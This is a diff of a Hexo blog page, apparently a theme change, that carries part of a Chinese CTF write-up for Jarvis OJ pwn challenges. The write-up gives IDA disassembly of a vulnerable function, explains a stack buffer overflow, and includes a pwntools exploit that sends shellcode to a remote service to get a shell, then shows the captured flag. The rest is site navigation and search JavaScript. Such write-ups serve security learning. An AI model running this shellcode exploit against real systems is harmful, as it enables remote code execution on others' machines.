-.text:0804848E                 push    offset format   ; &quot;What&#39;s this:%p?\n&quot;
-.text:08048493                 call    _printf
-.text:08048498                 add     esp, 10h
-.text:0804849B                 sub     esp, 4
-.text:0804849E                 push    100h            ; nbytes
-.text:080484A3                 lea     eax, [ebp+buf]
-.text:080484A9                 push    eax             ; buf
-.text:080484AA                 push    0               ; fd
-.text:080484AC                 call    _read
-.text:080484B1                 add     esp, 10h
-.text:080484B4                 nop
-.text:080484B5                 leave
-.text:080484B6                 retn
-.text:080484B6 ; } // starts at 804847B
-.text:080484B6 vulnerable_function endp
-</code></pre><p>这个函数首先打印出 buf 的首地址，然后从标准输入获取 100 字节写入 buf 中。buf 的长度为 0x04 - (-0x88) = 0x8c &lt; 0x100 ，又因为没有开启栈保护，会造成栈溢出。</p>
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0804847B</span>                 public vulnerable_function</span><br><span class="line">.text:<span class="number">0804847B</span> vulnerable_function proc near           ; CODE XREF: main+<span class="number">11</span>↓p</span><br><span class="line">.text:<span class="number">0804847B</span></span><br><span class="line">.text:<span class="number">0804847B</span> buf             = byte ptr -88h</span><br><span class="line">.text:<span class="number">0804847B</span></span><br><span class="line">.text:<span class="number">0804847B</span> ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0804847B</span>                 <span class="built_in">push</span>    ebp</span><br><span class="line">.text:<span class="number">0804847C</span>                 mov     ebp, esp</span><br><span class="line">.text:<span class="number">0804847E</span>                 sub     esp, 88h</span><br><span class="line">.text:<span class="number">08048484</span>                 sub     esp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">08048487</span>                 lea     eax, [ebp+buf]</span><br><span class="line">.text:<span class="number">0804848D</span>                 <span class="built_in">push</span>    eax</span><br><span class="line">.text:<span class="number">0804848E</span>                 <span class="built_in">push</span>    offset format   ; <span class="string">"What's this:%p?\n"</span></span><br><span class="line">.text:<span class="number">08048493</span>                 call    _printf</span><br><span class="line">.text:<span class="number">08048498</span>                 add     esp, 10h</span><br><span class="line">.text:<span class="number">0804849B</span>                 sub     esp, <span class="number">4</span></span><br><span class="line">.text:<span class="number">0804849E</span>                 <span class="built_in">push</span>    100h            ; nbytes</span><br><span class="line">.text:<span class="number">080484A3</span>                 lea     eax, [ebp+buf]</span><br><span class="line">.text:<span class="number">080484A9</span>                 <span class="built_in">push</span>    eax             ; buf</span><br><span class="line">.text:<span class="number">080484AA</span>                 <span class="built_in">push</span>    <span class="number">0</span>               ; fd</span><br><span class="line">.text:<span class="number">080484AC</span>                 call    _read</span><br><span class="line">.text:<span class="number">080484B1</span>                 add     esp, 10h</span><br><span class="line">.text:<span class="number">080484B4</span>                 nop</span><br><span class="line">.text:<span class="number">080484B5</span>                 leave</span><br><span class="line">.text:<span class="number">080484B6</span>                 retn</span><br><span class="line">.text:<span class="number">080484B6</span> ; &#125; // starts <span class="built_in">at</span> 804847B</span><br><span class="line">.text:<span class="number">080484B6</span> vulnerable_function endp</span><br></pre></td></tr></table></figure>
+<p>这个函数首先打印出 buf 的首地址，然后从标准输入获取 100 字节写入 buf 中。buf 的长度为 0x04 - (-0x88) = 0x8c &lt; 0x100 ，又因为没有开启栈保护，会造成栈溢出。</p>
 <p>这样大致的思路就有了。先截取 buf 的首地址，在其中写入拿 shell 的 shellcode ，再用 buf 地址覆盖 vulnerable_function 函数的返回地址使之执行 system(“/bin/sh”) 。不过我们不知道 system 的地址，此时可以用 pwntools 中的 asm() 函数。</p>
 <p>asm() 函数可以接收一个字符串作为参数，得到汇编码的机器代码。 这里我们可以用 asm(shellcraft.sh()) 的方式得到目标地址，shellcraft.sh() 就是执行 /bin/sh 的 shellcode。</p>
 <p>按照 shellcode + nope*n + ret_address 这个格式就可以拿到 shell 了。</p>
 <p>poc: </p>
-<pre><code class="Python">from pwn import *
-
-sh = remote(&#39;pwn2.jarvisoj.com&#39;, 9877)
-shellcode = asm(shellcraft.sh()) 
-p_buf = int(sh.recvline()[14:-2], 16)
-#print (hex(p_buf))
-
-payload = shellcode + (0x8c-len(shellcode)) * &#39;\x90&#39; + p32(p_buf)
-sh.sendline(payload)
-
-sh.interactive()
-</code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">'pwn2.jarvisoj.com'</span>, <span class="number">9877</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh()) </span><br><span class="line">p_buf = int(sh.recvline()[<span class="number">14</span>:<span class="number">-2</span>], <span class="number">16</span>)</span><br><span class="line"><span class="comment">#print (hex(p_buf))</span></span><br><span class="line"></span><br><span class="line">payload = shellcode + (<span class="number">0x8c</span>-len(shellcode)) * <span class="string">'\x90'</span> + p32(p_buf)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 <p>cat flag:  </p>
 <p><code>CTF{82c2aa534a9dede9c3a0045d0fec8617}</code></p>
 
-        
-                <blockquote style="margin: 2em 0 0;padding: 0.5em 1em;border-left: 3px solid #F44336;background-color: #F5F5F5;list-style: none;">
-                    <p><strong>
-                         
-                            版权声明： 本文遵循 <a href="/creativecommons.html" target="_blank">CC BY-NC-SA 3.0</a> 协议，转载请注明出处。
-                        </strong>
-                        <br>
-                        <strong>本文链接：</strong><a href="https://iCyris.github.io/2017/11/04/jarvisoj-wp/">https://iCyris.github.io/2017/11/04/jarvisoj-wp/</a>
-                    </p>
-                </blockquote>
-        
-    
-
-    
-</div>
-
-
-                
-
-                <!-- Post Comments -->
-                
-                    
-                
-            </div>
-
-            <!-- Post Prev & Next Nav -->
-            <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
-    <!-- Prev Nav -->
-    
-        <a href="/2018/02/02/hash-extender-attack/" id="post_nav-newer" class="prev-content">
-            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
-                <i class="material-icons">arrow_back</i>
-            </button>
-            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-            新篇
-        </a>
-    
-
-    <!-- Section Spacer -->
-    <div class="section-spacer"></div>
-
-    <!-- Next Nav -->
-    
-        <a href="/2017/10/27/code-leakage/" id="post_nav-older" class="next-content">
-            旧篇
-            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
-                <i class="material-icons">arrow_forward</i>
-            </button>
-        </a>
-    
-</nav>
-
-        </div>
+      
     </div>
-
-
-
-                    
-                        <!-- Overlay For Active Sidebar -->
-<div class="sidebar-overlay"></div>
-
-<!-- Material sidebar -->
-<aside id="sidebar" class="sidebar sidebar-colored sidebar-fixed-left" role="navigation">
-    <div id="sidebar-main">
-        <!-- Sidebar Header -->
-        <div class="sidebar-header header-cover" style="background-image: url(/);">
-    <!-- Top bar -->
-    <div class="top-bar"></div>
-
-    <!-- Sidebar toggle button -->
-    <button type="button" class="sidebar-toggle mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon" style="display: initial;" data-upgraded=",MaterialButton,MaterialRipple">
-        <i class="material-icons">clear_all</i>
-        <span class="mdl-button__ripple-container">
-            <span class="mdl-ripple">
-            </span>
-        </span>
-    </button>
-
-    <!-- Sidebar Avatar -->
-    <div class="sidebar-image">
-        <img src="/img/cyris.png" alt="Cyris's avatar">
-    </div>
-
-    <!-- Sidebar Email -->
-    <a data-toggle="dropdown" class="sidebar-brand" href="#settings-dropdown">
-        i@cyris.top
-        <b class="caret"></b>
-    </a>
-</div>
-
-
-        <!-- Sidebar Navigation  -->
-        <ul class="nav sidebar-nav">
-    <!-- User dropdown  -->
-    <li class="dropdown">
-        <ul id="settings-dropdown" class="dropdown-menu">
-            
-                <li>
-                    <a href="mailto: i@cyris.top" target="_blank" title="Email Me">
-                        
-                            <i class="material-icons sidebar-material-icons sidebar-indent-left1pc-element">email</i>
-                        
-                        Email Me
-                    </a>
-                </li>
-            
-        </ul>
-    </li>
-
-    <!-- Homepage -->
     
-        <li id="sidebar-first-li">
-            <a href="/">
-                
-                主页
-            </a>
-        </li>
-        
+    
     
 
-    <!-- Archives  -->
-    
-        <li class="dropdown">
-            <a href="#" class="ripple-effect dropdown-toggle" data-toggle="dropdown">
-                
-                    归档
-                <b class="caret"></b>
-            </a>
-            <ul class="dropdown-menu">
-            <li>
-                <a class="sidebar_archives-link" href="/archives/2018/03/">三月 2018<span class="sidebar_archives-count">5</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/02/">二月 2018<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/11/">十一月 2017<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/10/">十月 2017<span class="sidebar_archives-count">4</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/07/">七月 2017<span class="sidebar_archives-count">3</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/05/">五月 2017<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/04/">四月 2017<span class="sidebar_archives-count">2</span></a>
-            </ul>
-        </li>
-        
     
 
-    <!-- Categories  -->
-    
-        <li class="dropdown">
-            <a href="#" class="ripple-effect dropdown-toggle" data-toggle="dropdown">
-                
-                分类
-                <b class="caret"></b>
-            </a>
-            <ul class="dropdown-menu">
-                <li>
-                <a class="sidebar_archives-link" href="/categories/CTF/">CTF<span class="sidebar_archives-count">3</span></a></li><li><a class="sidebar_archives-link" href="/categories/Crypto/">Crypto<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/categories/Git/">Git<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/categories/Hexo/">Hexo<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/categories/Pwn/">Pwn<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/categories/Python/">Python<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/categories/学习资料/">学习资料<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/categories/小笔记/">小笔记<span class="sidebar_archives-count">3</span></a></li><li><a class="sidebar_archives-link" href="/categories/煮字/">煮字<span class="sidebar_archives-count">3</span></a>
-            </ul>
-        </li>
-        
     
 
-    <!-- Pages  -->
     
-        <li>
-            <a href="/timeline" title="Timeline">
-                
-                Timeline
-            </a>
-        </li>
-        
-    
-        <li>
-            <a href="/about" title="About">
-                
-                About
-            </a>
-        </li>
-        
-    
-
-    <!-- Article Number  -->
-    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    Cyris
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://iCyris.github.io/2017/11/04/jarvisoj-wp/" title="Jarvis OJ Writeup">https://iCyris.github.io/2017/11/04/jarvisoj-wp/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
 </ul>
 
+      </div>
+    
 
-        <!-- Sidebar Footer -->
-        <!--
-I'm glad you use this theme, the development is no so easy, I hope you can keep the copyright, I will thank you so much.
-If you still want to delete the copyrights, could you still retain the first one? Which namely "Theme Material"
-It will not impact the appearance and can give developers a lot of support :)
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+        </div>
+      
 
-很高兴您使用并喜欢该主题，开发不易 十分谢谢与希望您可以保留一下版权声明。
-如果您仍然想删除的话 能否只保留第一项呢？即 "Theme Material"
-它不会影响美观并可以给开发者很大的支持和动力。 :)
--->
+      
+      
+      
 
-<!-- Sidebar Divider -->
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/10/21/python-venv/" rel="next" title="Mac 配置虚拟环境 Virtualenv">
+                <i class="fa fa-chevron-left"></i> Mac 配置虚拟环境 Virtualenv
+              </a>
+            
+          </div>
 
-    <div class="sidebar-divider"></div>
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/02/02/hash-extender-attack/" rel="prev" title="哈希长度扩展攻击">
+                哈希长度扩展攻击 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
 
 
-<!-- Theme Material -->
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
-<!-- Help & Support -->
-<!--
+          </div>
+          
 
--->
 
-<!-- Feedback -->
-<!--
+          
+  <div class="comments" id="comments">
+    
+  </div>
 
--->
 
-<!-- About Theme -->
-<!--
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
 
--->
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/cyris.png"
+               alt="Cyris" />
+          <p class="site-author-name" itemprop="name">Cyris</p>
+           
+              <p class="site-description motion-element" itemprop="description">时雨金时，抓住有味。</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives/">
+                <span class="site-state-item-count">15</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">9</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              
+                <span class="site-state-item-count">10</span>
+                <span class="site-state-item-name">标签</span>
+              
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/iCyris" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                    
+                      GitHub
+                    
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://www.zhihu.com/people/icyris/activities" target="_blank" title="知乎">
+                  
+                    <i class="fa fa-fw fa-pencil-square-o"></i>
+                  
+                    
+                      知乎
+                    
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Web"><span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Login"><span class="nav-text">Login</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#api调用"><span class="nav-text">api调用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#神盾局的秘密"><span class="nav-text">神盾局的秘密</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#flag在管理员手里"><span class="nav-text">flag在管理员手里</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHPINFO"><span class="nav-text">PHPINFO</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pwn"><span class="nav-text">Pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#XMAN-level0"><span class="nav-text">[XMAN]level0</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XMAN-level1"><span class="nav-text">[XMAN]level1</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
 
     </div>
+  </aside>
 
-    <!-- Sidebar Image -->
-    
 
-</aside>
+        
+      </div>
+    </main>
 
-                    
-
-                    
-                        <!-- Footer Top Button -->
-                        <div id="back-to-top" class="toTop-wrap">
-    <a href="#top" class="toTop">
-        <i class="material-icons footer_top-i">expand_less</i>
-    </a>
-</div>
-
-                    
-
-                    <!--Footer-->
-<footer class="mdl-mini-footer" id="bottom">
-    
-        <!-- Paradox Footer Left Section -->
-        <div class="mdl-mini-footer--left-section sns-list">
-    <!-- Twitter -->
-    
-
-    <!-- Facebook -->
-    
-
-    <!-- Google + -->
-    
-
-    <!-- Weibo -->
-    
-
-    <!-- Instagram -->
-    
-
-    <!-- Tumblr -->
-    
-
-    <!-- Github -->
-    
-        <a href="https://github.com/iCyris" target="_blank">
-            <button class="mdl-mini-footer--social-btn social-btn footer-sns-github">
-                <span class="visuallyhidden">Github</span>
-            </button><!--
-     --></a>
-    
-
-    <!-- LinkedIn -->
-    
-
-    <!-- Zhihu -->
-    
-        <a href="https://www.zhihu.com/people/icyris/activities" target="_blank">
-            <button class="mdl-mini-footer--social-btn social-btn footer-sns-zhihu">
-                <span class="visuallyhidden">Zhihu</span>
-            </button><!--
-     --></a>
-    
-
-    <!-- Bilibili -->
-    
-
-    <!-- Telegram -->
-    
-    
-    <!-- V2EX -->
-    
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Cyris</span>
 </div>
 
 
-        <!--Copyright-->
-        <div id="copyright">
-            Copyright&nbsp;©<script type="text/javascript">var fd = new Date();document.write("&nbsp;" + fd.getFullYear() + "&nbsp;");</script>Cyris | 绿生
-            
-        </div>
+<div class="powered-by">
+  Powered by <a class="theme-link" href="https://hexo.io">Hexo</a>
+</div>
 
-        <!-- Paradox Footer Right Section -->
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    Muse
+  </a>
+</div>
 
-        <!--
-        I am glad you use this theme, the development is no so easy, I hope you can keep the copyright.
-        It will not impact the appearance and can give developers a lot of support :)
+        
 
-        很高兴您使用该主题，开发不易，希望您可以保留一下版权声明。
-        它不会影响美观并可以给开发者很大的支持。 :)
-        -->
+        
+      </div>
+    </footer>
 
-        <div class="mdl-mini-footer--right-section">
-            <div>
-                <div class="footer-develop-div">Powered by <a href="https://hexo.io" target="_blank" class="footer-develop-a">Hexo</a></div>
-                <div class="footer-develop-div">Theme - <a href="https://github.com/viosey/hexo-theme-material" target="_blank" class="footer-develop-a">Material</a></div>
-            </div>
-        </div>
     
-</footer>
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
 
+  </div>
 
-                    <!-- Import JS File -->
+  
 
-    <script>lsloader.load("lazyload_js","/js/lazyload.min.js?1BcfzuNXqV+ntF6gq+5X3Q==", true)</script>
-
-
-
-    <script>lsloader.load("js_js","/js/js.min.js?V/53wGualMuiPM3xoetD5Q==", true)</script>
-
-
-
-    <script>lsloader.load("np_js","/js/nprogress.js?pl3Qhb9lvqR1FlyLUna1Yw==", true)</script>
-
-
-<script type="text/ls-javascript" id="NProgress-script">
-    NProgress.configure({
-        showSpinner: true
-    });
-    NProgress.start();
-    $('#nprogress .bar').css({
-        'background': '#29d'
-    });
-    $('#nprogress .peg').css({
-        'box-shadow': '0 0 10px #29d, 0 0 15px #29d'
-    });
-    $('#nprogress .spinner-icon').css({
-        'border-top-color': '#29d',
-        'border-left-color': '#29d'
-    });
-    setTimeout(function() {
-        NProgress.done();
-        $('.fade').removeClass('out');
-    }, 800);
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
 </script>
 
 
@@ -1341,88 +866,424 @@ It will not impact the appearance and can give developers a lot of support :)
 
 
 
+  
 
 
 
 
-<!-- UC Browser Compatible -->
-<script>
-	var agent = navigator.userAgent.toLowerCase();
-	if(agent.indexOf('ucbrowser')>0) {
-		document.write('<link rel="stylesheet" href="/css/uc.css">');
-	   alert('由于 UC 浏览器使用极旧的内核，而本网站使用了一些新的特性。\n为了您能更好的浏览，推荐使用 Chrome 或 Firefox 浏览器。');
-	}
-</script>
-
-<!-- Import prettify js  -->
-
-    
-        
-            <script>lsloader.load("prettify_js","/js/prettify.min.js?WN07fivHQSMKWy7BmHBB6w==", true)</script>
-        
-    
 
 
 
-<!-- Window Load -->
-<!-- add class for prettify -->
-<script type="text/ls-javascript" id="window-load">
-    $(window).on('load', function() {
-        // Post_Toc parent position fixed
-        $('.post-toc-wrap').parent('.mdl-menu__container').css('position', 'fixed');
-    });
-
-    
-        
-            $(function() {
-                $('pre').addClass('prettyprint linenums').attr('style', 'overflow:auto;');
-                prettyPrint();
-                })
-        
-    
-    
-</script>
-
-<!-- MathJax Load-->
-
-
-<!-- Bing Background -->
-
-
-<script type="text/ls-javascript" id="lazy-load">
-    // Offer LazyLoad
-    queue.offer(function(){
-        $('.lazy').lazyload({
-            effect : 'show'
-        });
-    });
-
-    // Start Queue
-    $(document).ready(function(){
-        setInterval(function(){
-            queue.execNext();
-        },200);
-    });
-</script>
-
-<!-- Custom Footer -->
 
 
 
-<script>
-    (function(){
-        var scriptList = document.querySelectorAll('script[type="text/ls-javascript"]')
 
-        for (var i = 0; i < scriptList.length; ++i) {
-            var item = scriptList[i];
-            lsloader.runInlineScript(item.id,item.id);
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
